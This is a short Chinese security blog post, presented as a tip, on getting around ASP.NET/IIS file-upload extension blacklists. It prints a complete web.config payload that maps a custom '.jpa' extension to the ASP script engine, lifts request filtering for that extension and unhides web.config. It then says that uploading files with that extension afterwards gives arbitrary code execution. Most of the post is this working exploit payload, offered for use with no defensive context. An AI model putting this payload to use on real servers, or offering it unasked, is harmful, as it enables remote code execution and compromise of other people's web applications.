---
categories: Web安全
date: "2018-11-04T00:00:00Z"
description: tips
title: ASP.NET 文件上传黑名单解决办法
url: /archivers/2018-11-04/1
---



## ASP.NET 文件上传黑名单解决办法


来源：https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/

同过上传web.config配置文件可以使得任意扩展名的文件以脚本代码运行

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.jpa" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".jpa" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
   <appSettings>
</appSettings>
</configuration>
```

上传完成web.config到Web目录下后，可以再上传`*.jpa`的扩展名文件达到执行任意代码的目的。